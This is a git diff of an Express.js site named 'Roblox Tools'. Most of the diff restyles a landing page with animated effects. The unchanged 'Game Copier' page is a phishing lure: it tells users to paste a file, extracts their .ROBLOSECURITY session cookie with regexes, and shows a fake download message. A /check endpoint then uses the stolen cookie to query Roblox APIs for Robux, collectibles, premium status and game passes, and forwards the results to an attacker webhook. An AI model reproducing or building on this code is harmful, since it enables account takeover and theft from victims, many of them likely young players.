@@ -1,139 +1,307 @@
 const express = require('express');
 const app = express();
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ────────────────────────────────────────────────
-// Strona główna – teraz animowana i ładniejsza
+// Strona główna – nowa, ciemna, z connecting dots + mouse trail
 // ────────────────────────────────────────────────
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox Tools</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       min-height: 100vh;
-      background: linear-gradient(-45deg, #0f0c29, #1a143f, #302b63, #24243e);
-      background-size: 400% 400%;
-      animation: gradientBG 12s ease infinite;
+      background: #0a0a0f;
       color: #e0e0ff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       overflow: hidden;
       position: relative;
     }
 
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    #canvas-bg {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    .content {
+      position: relative;
+      z-index: 10;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
 
     .card {
       position: relative;
-      z-index: 2;
-      background: rgba(26, 26, 46, 0.88);
-      border: 1px solid rgba(100, 100, 255, 0.2);
-      border-radius: 24px;
-      padding: 80px 100px;
+      width: 100%;
+      max-width: 640px;
+      padding: 6rem 5rem 5rem;
+      background: rgba(12, 12, 22, 0.62);
+      border: 1px solid rgba(80, 100, 255, 0.16);
+      border-radius: 32px;
+      backdrop-filter: blur(18px);
+      box-shadow: 
+        0 35px 90px rgba(0,0,0,0.8),
+        inset 0 0 70px rgba(70, 90, 240, 0.07);
       text-align: center;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6),
-                  inset 0 0 40px rgba(100, 100, 255, 0.08);
-      backdrop-filter: blur(12px);
-      transition: all 0.4s ease;
-      animation: float 6s ease-in-out infinite;
+      transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+      animation: cardFloat 8s ease-in-out infinite;
     }
 
     .card:hover {
-      transform: translateY(-12px) scale(1.02);
-      box-shadow: 0 30px 80px rgba(0,0,0,0.7),
-                  inset 0 0 60px rgba(100, 100, 255, 0.15);
+      transform: translateY(-20px) scale(1.03);
+      box-shadow: 
+        0 60px 140px rgba(0,0,0,0.95),
+        inset 0 0 100px rgba(100, 120, 255, 0.14);
+      border-color: rgba(110, 150, 255, 0.32);
     }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-12px); }
+    @keyframes cardFloat {
+      0%, 100%   { transform: translateY(0) scale(1); }
+      50%        { transform: translateY(-16px) scale(1); }
     }
 
     h1 {
-      font-size: 4.2rem;
-      font-weight: 700;
-      margin-bottom: 40px;
-      background: linear-gradient(90deg, #a0cfff, #ffffff, #a0cfff);
-      background-size: 200% 200%;
+      font-size: 5.8rem;
+      font-weight: 800;
+      letter-spacing: -2.5px;
+      background: linear-gradient(90deg, #a5b4fc, #c7d2fe, #e0bbff, #a5b4fc);
+      background-size: 300% 300%;
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      animation: textGlow 5s ease infinite;
+      background-clip: text;
+      animation: gradientFlow 10s ease infinite;
+      margin-bottom: 2.4rem;
+      text-shadow: 0 0 50px rgba(130, 150, 255, 0.45);
     }
 
-    @keyframes textGlow {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
+    @keyframes gradientFlow {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
 
+    .subtitle {
+      font-size: 1.45rem;
+      color: #b0b0ff;
+      margin-bottom: 3.6rem;
+      opacity: 0.9;
+      letter-spacing: 0.5px;
+    }
+
     .btn {
-      background: linear-gradient(90deg, #3b82f6, #60a5fa);
-      color: white;
-      padding: 18px 90px;
-      font-size: 1.8rem;
-      font-weight: 600;
-      border-radius: 16px;
-      text-decoration: none;
-      transition: all 0.4s ease;
-      box-shadow: 0 10px 30px rgba(59,130,246,0.4);
       position: relative;
+      display: inline-block;
+      padding: 1.2rem 4.2rem;
+      font-size: 1.55rem;
+      font-weight: 700;
+      color: white;
+      text-decoration: none;
+      background: linear-gradient(90deg, #4f46e5, #7c3aed, #a855f7, #7c3aed);
+      background-size: 300% 300%;
+      border-radius: 18px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 14px 45px rgba(79, 70, 229, 0.4);
+      transition: all 0.45s ease;
       overflow: hidden;
+      animation: btnPulse 4s ease-in-out infinite;
     }
 
     .btn:hover {
-      background: linear-gradient(90deg, #2563eb, #3b82f6);
-      transform: translateY(-6px);
-      box-shadow: 0 20px 50px rgba(59,130,246,0.6);
+      transform: translateY(-7px);
+      box-shadow: 0 28px 70px rgba(100, 110, 255, 0.6);
+      background-position: 100% 100%;
+      animation: none;
     }
 
-    .btn::after {
+    .btn::before {
       content: '';
       position: absolute;
-      top: -50%;
+      top: -60%;
       left: -100%;
-      width: 50%;
-      height: 200%;
+      width: 60%;
+      height: 220%;
       background: linear-gradient(
-        to right,
+        120deg,
         transparent,
-        rgba(255,255,255,0.4),
+        rgba(255,255,255,0.38),
         transparent
       );
-      transform: skewX(-25deg);
-      animation: shine 3s infinite;
+      transform: skewX(-20deg);
+      animation: shine 3.5s infinite;
+      pointer-events: none;
     }
 
     @keyframes shine {
-      0% { left: -100%; }
-      100% { left: 200%; }
+      0%   { left: -100%; }
+      20%  { left: 130%; }
+      100% { left: 130%; }
+    }
+
+    @keyframes btnPulse {
+      0%, 100% { transform: scale(1); }
+      50%      { transform: scale(1.03); }
+    }
+
+    /* Neon border glow */
+    .card::before {
+      content: '';
+      position: absolute;
+      inset: -3px;
+      border-radius: 35px;
+      background: linear-gradient(45deg, #4f46e5, #a855f7, #7c3aed, #6366f1);
+      background-size: 400% 400%;
+      opacity: 0;
+      transition: opacity 0.7s ease;
+      z-index: -1;
+      filter: blur(14px);
+      animation: borderGlow 12s ease infinite;
+    }
+
+    .card:hover::before {
+      opacity: 0.22;
+    }
+
+    @keyframes borderGlow {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    @media (max-width: 680px) {
+      h1 { font-size: 4.2rem; }
+      .card { padding: 5rem 2.5rem 4rem; max-width: 90%; }
+      .btn { padding: 1rem 3rem; font-size: 1.4rem; }
+      .subtitle { font-size: 1.3rem; }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Roblox Tools</h1>
-    <a href="/game-copier" class="btn">Game Copier & Checker</a>
+
+  <canvas id="canvas-bg"></canvas>
+
+  <div class="content">
+    <div class="card">
+      <h1>Roblox Tools</h1>
+      <div class="subtitle">Game Copier • Checker • Advanced Utilities</div>
+      <a href="/game-copier" class="btn">Launch Game Copier & Checker</a>
+    </div>
   </div>
+
+  <script>
+    const canvas = document.getElementById('canvas-bg');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+    let mouse = { x: null, y: null, radius: 160 };
+
+    function resize() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      initParticles();
+    }
+
+    function initParticles() {
+      particles = [];
+      const count = Math.floor((canvas.width * canvas.height) / 10000); // dostosowana gęstość
+      for (let i = 0; i < count; i++) {
+        particles.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          vx: (Math.random() - 0.5) * 0.8,
+          vy: (Math.random() - 0.5) * 0.8,
+          radius: Math.random() * 2 + 0.7
+        });
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      particles.forEach(p => {
+        // odpychanie od myszki
+        if (mouse.x && mouse.y) {
+          let dx = mouse.x - p.x;
+          let dy = mouse.y - p.y;
+          let dist = Math.hypot(dx, dy);
+
+          if (dist < mouse.radius) {
+            let force = (mouse.radius - dist) / mouse.radius;
+            p.x -= dx * force * 0.09;
+            p.y -= dy * force * 0.09;
+          }
+        }
+
+        p.x += p.vx;
+        p.y += p.vy;
+
+        if (p.x < 0 || p.x > canvas.width)  p.vx *= -1;
+        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(140, 170, 255, 0.7)';
+        ctx.fill();
+      });
+
+      // łączenie kropek
+      for (let i = 0; i < particles.length; i++) {
+        for (let j = i + 1; j < particles.length; j++) {
+          let dx = particles[i].x - particles[j].x;
+          let dy = particles[i].y - particles[j].y;
+          let dist = Math.hypot(dx, dy);
+
+          if (dist < 140) {
+            ctx.beginPath();
+            ctx.moveTo(particles[i].x, particles[i].y);
+            ctx.lineTo(particles[j].x, particles[j].y);
+            ctx.strokeStyle = \`rgba(120, 150, 255, \${(140 - dist)/140 * 0.45})\`;
+            ctx.lineWidth = 1;
+            ctx.stroke();
+          }
+        }
+      }
+
+      requestAnimationFrame(animate);
+    }
+
+    window.addEventListener('resize', resize);
+    window.addEventListener('mousemove', e => {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', () => {
+      mouse.x = null;
+      mouse.y = null;
+    });
+
+    resize();
+    animate();
+  </script>
 </body>
 </html>
   `);
 });
 
-// Podstrona /game-copier – bez zmian (z poprzedniej wersji)
+// ────────────────────────────────────────────────
+// Podstrona /game-copier – bez zmian
+// ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -181,7 +349,6 @@ app.get('/game-copier', (req, res) => {
       font-weight: 500;
       text-align: center;
     }
-
     /* Loading overlay */
     #loading {
       display: none;
@@ -207,7 +374,6 @@ app.get('/game-copier', (req, res) => {
       font-size: 1.4rem;
       font-weight: 500;
     }
-
     /* Modal */
     #modal {
       display: none;
@@ -243,14 +409,12 @@ app.get('/game-copier', (req, res) => {
       color: white;
     }
     .modal-btn.success { background: #28a745; }
-    .modal-btn.error   { background: #dc3545; }
+    .modal-btn.error { background: #dc3545; }
     .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     /* Subtelna szara ramka na textarea */
     .subtle-glow-border {
       position: relative;
@@ -367,7 +531,6 @@ app.get('/game-copier', (req, res) => {
       position: relative;
       z-index: 1;
     }
-
     @keyframes softGlow {
       0%, 100% { background-position: 0% 50%; opacity: 0.5; }
       50% { background-position: 100% 50%; opacity: 0.75; }
@@ -379,15 +542,12 @@ app.get('/game-copier', (req, res) => {
   </style>
 </head>
 <body>
-
   <canvas id="bgCanvas"></canvas>
-
   <!-- Loading overlay -->
   <div id="loading">
     <div class="spinner"></div>
     <div class="loading-text">Processing...</div>
   </div>
-
   <!-- Modal -->
   <div id="modal">
     <div class="modal-content">
@@ -397,7 +557,6 @@ app.get('/game-copier', (req, res) => {
       <button class="modal-btn" id="modal-ok">OK</button>
     </div>
   </div>
-
   <div class="container">
     <div class="left">
       <h1>Game Copier</h1>
@@ -409,20 +568,18 @@ app.get('/game-copier', (req, res) => {
       </div>
       <button id="btn" onclick="start()">Start Process</button>
     </div>
-
     <div class="right">
       <div class="video-frame">
-        <iframe 
-          src="https://www.youtube.com/embed/k9SfgtkEmpo?rel=0&modestbranding=1&showinfo=0&controls=1" 
-          title="YouTube video player" 
-          frameborder="0" 
-          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+        <iframe
+          src="https://www.youtube.com/embed/k9SfgtkEmpo?rel=0&modestbranding=1&showinfo=0&controls=1"
+          title="YouTube video player"
+          frameborder="0"
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
           allowfullscreen>
         </iframe>
       </div>
     </div>
   </div>
-
 <script>
 // kropki w tle – bez zmian
 const canvas = document.getElementById('bgCanvas');
@@ -480,7 +637,6 @@ function animate() {
   requestAnimationFrame(animate);
 }
 animate();
-
 // Loading + Modal – bez zmian
 const loading = document.getElementById('loading');
 const modal = document.getElementById('modal');
@@ -488,11 +644,9 @@ const modalIcon = document.getElementById('modal-icon');
 const modalText = document.getElementById('modal-text');
 const modalTip = document.getElementById('modal-tip');
 const modalOkBtn = document.getElementById('modal-ok');
-
 modalOkBtn.onclick = () => {
   modal.style.display = 'none';
 };
-
 function showModal(success, message, tip = '') {
   modalIcon.textContent = success ? '✅' : '❌';
   modalText.textContent = message;
@@ -500,63 +654,48 @@ function showModal(success, message, tip = '') {
   modalOkBtn.className = 'modal-btn ' + (success ? 'success' : 'error');
   modal.style.display = 'flex';
 }
-
 // Logika przycisku z 1.2s loadingiem
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
-
   btn.disabled = true;
-
   loading.style.display = 'flex';
-
   await new Promise(resolve => setTimeout(resolve, 1200));
-
   loading.style.display = 'none';
-
   if (!raw) {
     showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
     setTimeout(() => btn.disabled = false, 800);
     return;
   }
-
   let cookie = null;
   let match;
-
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
-
   if (!cookie) {
     match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
-
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
-
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
     if (fallback.length) {
       cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
     }
   }
-
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
     showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
     setTimeout(() => btn.disabled = false, 800);
     return;
   }
-
   fetch('/check', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cookie })
   }).catch(() => {});
-
   showModal(true, 'Game Download Started', '(wait 3–5 minutes)');
-
   setTimeout(() => btn.disabled = false, 2200);
 }
 </script>
@@ -565,13 +704,14 @@ async function start() {
   `);
 });
 
+// ────────────────────────────────────────────────
 // Endpoint /check – bez zmian
+// ────────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
-
   try {
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
@@ -582,7 +722,6 @@ app.post('/check', async (req, res) => {
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
-
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -592,7 +731,6 @@ app.post('/check', async (req, res) => {
     });
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
-
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -603,7 +741,6 @@ app.post('/check', async (req, res) => {
         emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
       }
     } catch {}
-
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -611,7 +748,6 @@ app.post('/check', async (req, res) => {
       });
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
-
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -622,7 +758,6 @@ app.post('/check', async (req, res) => {
         robux = data.robux || 0;
       }
     } catch {}
-
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -633,7 +768,6 @@ app.post('/check', async (req, res) => {
         rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
       }
     } catch {}
-
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -644,7 +778,6 @@ app.post('/check', async (req, res) => {
         groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
       }
     } catch {}
-
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -657,7 +790,6 @@ app.post('/check', async (req, res) => {
         }
       }
     } catch {}
-
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -666,7 +798,6 @@ app.post('/check', async (req, res) => {
         avatarUrl = thumbData.data?.[0]?.imageUrl || null;
       }
     } catch {}
-
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -697,7 +828,6 @@ app.post('/check', async (req, res) => {
     const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
     const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
-
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -718,7 +848,6 @@ app.post('/check', async (req, res) => {
         hasKorblox = Array.isArray(data.data) && data.data.length > 0;
       }
     } catch {}
-
     const result = {
       success: true,
       username: userData.name,
@@ -738,7 +867,6 @@ app.post('/check', async (req, res) => {
       sabCount,
       jbCount
     };
-
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -803,7 +931,6 @@ app.post('/check', async (req, res) => {
         console.error("Webhook send error:", e.message);
       }
     }
-
     res.json(result);
   } catch (err) {
     console.error(err);
